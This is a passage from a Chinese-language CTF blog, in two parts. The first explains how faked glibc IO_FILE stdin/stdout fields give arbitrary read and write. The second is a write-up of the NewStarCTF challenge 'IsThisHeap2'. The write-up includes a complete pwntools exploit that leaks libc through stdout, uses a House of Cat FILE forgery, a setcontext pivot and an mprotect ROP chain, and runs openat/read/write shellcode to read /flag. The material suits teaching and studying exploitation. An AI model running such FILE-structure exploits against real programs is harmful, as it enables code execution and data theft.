<span class=\"keyword\">while</span> (want &gt; <span class=\"number\">0</span>) <span class=\"comment\">//还需要get的字节数</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (have &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          ...</span><br><span class=\"line\">          <span class=\"comment\">//memcpy</span></span><br><span class=\"line\"> </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base</span><br><span class=\"line\">          &amp;&amp; want &lt; (<span class=\"type\">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__underflow (fp) == EOF)  <span class=\"comment\">// 调用__underflow读入数据</span></span><br><span class=\"line\">          ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - want;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _IO_new_file_underflow (_IO_FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _IO_ssize_t count;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">// 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。</span></span><br><span class=\"line\">  <span class=\"comment\">// 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 如果输入缓冲区里存在数据，则直接返回</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">// 调用_IO_SYSREAD函数最终执行系统调用读取数据</span></span><br><span class=\"line\">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class=\"line\">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure>\n\n<p>如果<code>_IO_buf_base</code>为空，则会初始化缓冲区。</p>\n<p>之后会判断<code>_IO_read_ptr</code>对应的空间是否有剩余，如果有则**直接复制到目的地址(传入的data)**。</p>\n<p>如果<code>_IO_read_ptr</code>中的内容没有或不够，则调用<code>__underflow</code>函数<strong>执行系统调用读取数据</strong>（<code>SYS_read</code>）到从<code>_IO_buf_base</code>开始到<code>_IO_buf_end</code>的位置，默认<code>0x400</code>字节。</p>\n<p>此时若实际读入了<code>n</code>个字节的数据，则<code>_IO_read_end = _IO_buf_base + n</code>（即<code>_IO_read_end</code>指向实际读入的最后一个字节的数据），之后再将<code>_IO_read_ptr</code>中的数据复制到目的地址(传入的data)。</p>\n<p>综上，为了做到<strong>任意写</strong>，满足如下条件，即可进行利用：</p>\n<ol>\n<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>（使得<code>_IO_read_ptr</code>没有剩余数据，从而可以通过<code>SYS_read</code>读入数据）。</li>\n<li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（一般不用特意设置）。</li>\n<li> 设置<code>_fileno</code>为<code>0</code>（一般不用特意设置）。</li>\n<li> 设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_ buf_end</code>为<code>write_end</code>（我们目标写的起始地址是<code>write_start</code>，写结束地址为<code>write_end</code>），且使得<code>_IO_buf_end-_IO_buf_base</code>大于要写入的数据长度。</li>\n</ol>\n<h4 id=\"利用stdout进行任意读-写\"><a href=\"#利用stdout进行任意读-写\" class=\"headerlink\" title=\"利用stdout进行任意读/写\"></a>利用stdout进行任意读/写</h4><p><code>printf</code>，<code>fwrite</code>，<code>puts</code>等输出走<code>IO</code>指针（<code>write</code>不走），最后会调用vtable中的<code>_xsputn()</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class=\"type\">const</span> <span class=\"type\">void</span> *data, _IO_size_t n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *s = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) data;</span><br><span class=\"line\">  _IO_size_t to_do = n;</span><br><span class=\"line\">  <span class=\"type\">int</span> must_flush = <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_size_t count = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123; <span class=\"comment\">//如果是行缓冲模式...</span></span><br><span class=\"line\">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class=\"comment\">//判断输出缓冲区还有多少空间</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt;= n)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"type\">const</span> <span class=\"type\">char</span> *p;</span><br><span class=\"line\">          <span class=\"keyword\">for</span> (p = s + n; p &gt; s; )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (*--p == <span class=\"string\">&#x27;\\n&#x27;</span>) <span class=\"comment\">//最后一个换行符\\n为截断符，且需要刷新输出缓冲区</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  count = p - s + <span class=\"number\">1</span>;</span><br><span class=\"line\">                  must_flush = <span class=\"number\">1</span>; <span class=\"comment\">//标志为真：需要刷新输出缓冲区</span></span><br><span class=\"line\">                  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class=\"comment\">//判断输出缓冲区还有多少空间（全缓冲模式）</span></span><br><span class=\"line\">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">0</span>) <span class=\"comment\">//输出缓冲区余下空间&gt;0</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">//如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; to_do)</span><br><span class=\"line\">      \tcount = to_do;</span><br><span class=\"line\">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count); <span class=\"comment\">//全部复制到write_ptr</span></span><br><span class=\"line\">      \t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">//控制write_ptr实现任意写</span></span><br><span class=\"line\">      s += count;</span><br><span class=\"line\">      to_do -= count;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (to_do + must_flush &gt; <span class=\"number\">0</span>) <span class=\"comment\">//任意读的利用</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_size_t block_size, do_write;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class=\"comment\">//调用_IO_OVERFLOW</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> to_do == <span class=\"number\">0</span> ? EOF : n - to_do;</span><br><span class=\"line\">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class=\"line\">      do_write = to_do - (block_size &gt;= <span class=\"number\">128</span> ? to_do % block_size : <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (do_write)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          count = new_do_write (f, s, do_write);</span><br><span class=\"line\">          to_do -= count;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (count &lt; do_write)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (to_do)</span><br><span class=\"line\">        to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_2_1_stdout_</code>中，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>为输出缓冲区起始位置（默认大小为<code>0x400</code>），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。<br>缓冲区建立函数<code>_IO_doallocbuf</code>会建立输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中，在建立了输出缓冲区后，会将基址赋值给<code>_IO_write_base</code>。</p>\n<p>若是设置的是<strong>全缓冲模式</strong><code>_IO_FULL_BUF</code>（一次接收所有输入），则会将结束地址给<code>_IO_write_end</code>，若是设置的是<strong>行缓冲模式</strong><code>_IO_LINE_BUF</code>（一次接收一行），则<code>_IO_write_end</code>中存的是<code>_IO_buf_base</code>。</p>\n<p>此外，<code>_IO_write_ptr</code>表示输出缓冲区中已经使用到的地址，<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。</p>\n<p>（1）任意写</p>\n<p>在行缓冲模式下，判断输出缓冲区还有多少空间，用的是<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>，而在全缓冲模式下，用的是<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>。</p>\n<p>如果还有空间剩余，则会将要输出的<code>count</code>长度的数据复制到<code>_IO_write_ptr</code>，因此可通过这一点来实现任意地址写的功能。<br><strong>利用方式</strong>：只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可。<br>这里需要注意的是，有宏定义<code>#define _IO_LINE_BUF 0x0200</code>，<code>flag &amp; _IO_LINE_BUF</code>为真，则表示<code>flag</code>中包含了<code>_IO_LINE_BUF</code>标识，即开启了行缓冲模式（可用<code>setvbuf(stdout,0,_IOLBF,1024)</code>开启），若要构造<code>flag</code>包含<code>_IO_LINE_BUF</code>标识，则<code>flag |= 0x200</code>即可。</p>\n<p>（2）任意读</p>\n<p>任意读利用了<code>if (to_do + must_flush &gt; 0)</code>成立分支的部分</p>\n<p><code>to_do</code>表明还有多少字节没有读入，因此一定是非负数。<code>must_flush</code>表明输出缓冲区是否需要刷新，当在行缓冲模式下检测到有换行符<code>\\n</code>的时候被赋值为1，因此当输出内容中有<code>\\n</code>且为<strong>行缓冲模式</strong>时就会执行该分支的内容，如用<code>puts</code>函数输出就一定会执行。<br>若<code>to_do</code>大于<code>0</code>，也就是还有字符没有读入，也会执行该分支中的内容。因此，当 <strong>输出缓冲区未建立</strong> 或者 <strong>输出缓冲区没有剩余空间</strong> 或者 <strong>输出缓冲区剩余的空间不够一次性将目标地址中的数据完全复制过来</strong> 的时候，也会执行该<code>if</code>分支中的内容。<br><code>if</code>分支中主要调用了<code>_IO_OVERFLOW()</code>来刷新输出缓冲区，而在此过程中会调用<code>_IO_do_write()</code>输出我们想要的数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class=\"type\">int</span> ch)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 判断标志位是否包含_IO_NO_WRITES =&gt; _flags需要不包含_IO_NO_WRITES</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位</span></span><br><span class=\"line\">  <span class=\"comment\">// 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class=\"number\">0</span> || f-&gt;_IO_write_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 调用_IO_do_write 输出 输出缓冲区</span></span><br><span class=\"line\">  <span class=\"comment\">// 从_IO_write_base开始，输出(_IO_write_ptr - f-&gt;_IO_write_base)个字节的数据</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ch == EOF)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class=\"line\">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) ch;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">static</span> _IO_size_t <span class=\"title function_\">new_do_write</span> <span class=\"params\">(_IO_FILE *fp, <span class=\"type\">const</span> <span class=\"type\">char</span> *data, _IO_size_t to_do)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  _IO_size_t count;</span><br><span class=\"line\">  <span class=\"comment\">// 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class=\"line\">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_off64_t new_pos</span><br><span class=\"line\">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_pos == _IO_pos_BAD)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      fp-&gt;_offset = new_pos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 调用函数输出输出缓冲区</span></span><br><span class=\"line\">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">return</span> count;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>综上，为了做到<strong>任意读</strong>，需要满足如下条件：<br>(1) 设置<code>_flag &amp;~ _IO_NO_WRITES</code>，即<code>_flag &amp;~ 0x8</code>；<br>(2) 设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>，即<code>_flag | 0x800</code>；<br>(3) 设置<code>_fileno</code>为<code>1</code>(stdout)；<br>(4) 设置<code>_IO_write_base</code>指向想要泄露的地方，<code>_IO_write_ptr</code>指向泄露结束的地址；<br>(5) 设置<code>_IO_read_end</code>等于<code>_IO_write_base</code> 或 设置<code>_flag &amp; _IO_IS_APPENDING</code>即，<code>_flag | 0x1000</code>。<br>此外，有一个<strong>大前提</strong>：需要调用<code>_IO_OVERFLOW()</code>才行，因此**需使得需要输出的内容中含有<code>\\n</code>换行符 或 设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>**（输出缓冲区无剩余空间）等。<br>一般来说，经常利用<code>puts</code>函数加上述<code>stdout</code>任意读的方式泄露<code>libc</code>。</p>\n<p>flag的构造如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_flags = <span class=\"number\">0xfbad0000</span> </span><br><span class=\"line\">_flags &amp; = ~_IO_NO_WRITES <span class=\"comment\">// _flags = 0xfbad0000</span></span><br><span class=\"line\">_flags | = _IO_CURRENTLY_PUTTING <span class=\"comment\">// _flags = 0xfbad0800</span></span><br><span class=\"line\">_flags | = _IO_IS_APPENDING <span class=\"comment\">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>\n\n<p>例如在<code>libc-2.27</code>下，构造<code>fakefile = p64(0xfbad1800) + p64(0)*3 + b&#39;\\x58&#39;</code>（<code>\\x58</code>覆盖<code>write_base</code>的低位），泄露出的第一个地址即为<code>_IO_file_jumps</code>的地址。</p>"},{"title":"IsThisHeap2","date":"2023-01-02T13:54:26.000Z","_content":"\nNewStarCTF，看起来是堆题实际上是对IO_FILE的利用。\n<!-- more -->\n\n查壳，啥都开了，就像真的堆题一样\n\n```sh\n[*] '/home/alphonse/CTF_GAME/new_star/isThisHeap2/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n而且还开了沙箱\n\n```sh\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012\n 0004: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0012\n 0005: 0x15 0x06 0x00 0x0000009d  if (A == prctl) goto 0012\n 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012\n 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012\n 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012\n 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012\n 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012\n 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0012: 0x06 0x00 0x00 0x00000000  return KILL\n```\n\n其中ban掉open、execve是比较麻烦的。\n\n程序有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete和show都没有实现。\n\n在add中最多可以同时存在16个chunk，malloc长度固定为0x200。\n\n在edit中同样存在下标越界漏洞，没有检查idx是否<0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x200字节的内容。heaps在0x202060，而在0x202008处有一个**dso_handle指向自己，可以修改dso_handle获得一个任意写，偏移为-11**。\n\n然而这里因为开了RELRO，应该是写不了GOT表了，并且由于没有了show，要leak libc也没那么容易了。\n\n**不过stdin、stdout、stderr的指针就在heaps前面，这里可以直接通过edit取出他们的指针并对他们进行修改。**\n\nstdout、stdin、stderr的偏移是-8、-6、-4。\n\n这题是对IO_FILE的利用，可以通过edit的漏洞直接对stdin、stdout、stderr进行操作，可以影响文件流的操作。\n\n泄露libc可以通过修改stdout的`_flag`字段和`_IO_write_base`字段进行泄露。puts函数最后对调用到stdout的vtable的`_xsputn()`，通过IO_FILE中的指针指定输出内容的位置。修改对应指针内容就可以改变输出的位置，从而泄露信息，之后debug调一下就能找到libc中地址的位置，从而泄露出libc。\n\n```py\npayload=p64(0xfbad1800) + p64(0)*3 + '\\x00' \n# flag + _IO_read_ptr + _IO_read_end + _IO_read_base + _IO_write_base(只改了低字节)\n```\n\n后面get shell就有些麻烦了，官方的WP是走的House of apple2或House of cat打puts劫持程序流，之后用mprotect分配可读可写可执行的空间之后写shellcode走orw（open被ban了只能走openat）。\n\n看网上有走rop的orw（open被ban了只能走openat），通过修改stdin劫持scanf将rop链写到main的返回地址，并在写完后再写一次将scanf的返回地址覆盖为`leave;ret;`跳出到main结束，最后main返回调用rop链。\n\n先按照官方的WP走，House of apple2和House of cat都是对**_IO_wfile_jumps**中的函数进行攻击，官方的wp走的好像是`House of Cat`。\n\n首先利用`stdout`泄露`libc`，之后便修改`stdout`走`House of Cat`，伪造`vtable`时修改为`_IO_wfile_jumps`，并通过偏移将`xsputn`修改为`seekoff`，伪造`wide_data->vtable`时将`_IO_WOVERFLOW`修改为`set_context+61`，后面调用`puts`就会一路走到`set_context+61`，设置各个寄存器，劫持rip执行read输入数据，同时也要劫持rsp和read的地址使得输入的数据能够栈溢出，之后通过栈溢出走rop链调用`mprotect`修改写入数据位置为`rwx`，之后调用写入的`shellcode`执行`orw`。\n\n官方wp：\n\n```py\n#!/usr/bin/env python2\n# -*- coding: utf-8 -*\nfrom pwn import *\n\nse      = lambda data               :p.send(data) \nsa      = lambda delim,data         :p.sendafter(delim, data)\nsl      = lambda data               :p.sendline(data)\nsla     = lambda delim,data         :p.sendlineafter(delim, data)\nsea     = lambda delim,data         :p.sendafter(delim, data)\nrc      = lambda numb=4096          :p.recv(numb)\nru      = lambda delims, drop=True  :p.recvuntil(delims, drop)\nuu32    = lambda data               :u32(data.ljust(4, '\\0'))\nuu64    = lambda data               :u64(data.ljust(8, '\\0'))\n\n\nelf = ELF('./pwn')\ncontext(arch = elf.arch, os = 'linux',log_level = 'debug')\n# p = process('./pwn')\np = remote(\"node4.buuoj.cn\",28657)\n\ndef edit(idx,data):\n    sla(\">> \",str(3))\n    sla(\"Index\",str(idx))\n    sea(\"Content\",str(data))\n\nedit(-8,p64(0xfbad1800)+p64(0)*3+'\\x00')\nlibc_leak = uu64(ru('\\x7f',drop=False)[-6:])\nlibc_base = libc_leak - 0x1ec980\n\nlibc = ELF('./libc-2.31.so')\nlibc.address = libc_base\nsystem_addr = libc.sym.system\nbin_sh = libc.search('/bin/sh').next()\nmagic = libc.sym.setcontext + 61\n\nrdx = 0x0000000000142c92 + libc_base\nrdi = 0x0000000000023b6a + libc_base\nrsi = 0x000000000002601f + libc_base\n\n_IO_wfile_jumps = libc_base + 0x1e8f60\ntarget = libc_base + 0x1ed6a0 # _IO_2_1_stdout_\naddr = target&(~0xfff)\nfuck_frame = SigreturnFrame()\nfuck_frame.rdi = 0\nfuck_frame.rsi = addr\nfuck_frame.rdx = 0x300\nfuck_frame.rsp = addr\nfuck_frame.rip = libc.sym.read\nfuck_io = p64(0)*5 + p64(1) + p64((((((target+0x100)>>32)-1))<<32)+((target+0x100)&0xffffffff)) + p64(3) + p64(4)\n# p64(1)后的那个地址指向fuck_frame，后面set_context会将这个地址设置为rdx，并以其为基准将fuck_frame的值赋给寄存器\nfuck_io = fuck_io.ljust(0x88,'\\0')\nfuck_io += p64(target+0x30)\nfuck_io = fuck_io.ljust(0xa0,'\\0')\nfuck_io += p64(target+0x10)   # wide_data\nfuck_io = fuck_io.ljust(0xd8,'\\0')\nfuck_io += p64(_IO_wfile_jumps + 0x10) # vtable 通过偏移将xsputn改为seekoff\nfuck_io += p64(0) + p64(magic) + p64(target+0xe8-0x18) + p64(0) # magic覆盖了wide_data的vtable中的_IO_WOVERFLOW\nfuck_io += str(fuck_frame)\n\nedit(-8,fuck_io)\n\nsleep(0.1)\nse(p64(rdi)+p64(addr)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(libc.sym.mprotect)+p64(addr+0x40)+asm('lea rbp,[rsp+0x200];'+shellcraft.openat(0,\"/flag\",0)+shellcraft.read('rax','rbp',0x100)+shellcraft.write(1,'rbp',0x100)+shellcraft.exit(0)))\n\np.interactive()\n```\n\n\n\n\n\n\n\n","source":"_posts/IsThisHeap2.md","raw":"---\ntitle: IsThisHeap2\ndate: 2023-01-02 21:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- IO_FILE\n- index overflow\n\n---\n\nNewStarCTF，看起来是堆题实际上是对IO_FILE的利用。\n<!-- more -->\n\n查壳，啥都开了，就像真的堆题一样\n\n```sh\n[*] '/home/alphonse/CTF_GAME/new_star/isThisHeap2/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n而且还开了沙箱\n\n```sh\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012\n 0004: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0012\n 0005: 0x15 0x06 0x00 0x0000009d  if (A == prctl) goto 0012\n 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012\n 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012\n 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012\n 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012\n 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012\n 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0012: 0x06 0x00 0x00 0x00000000  return 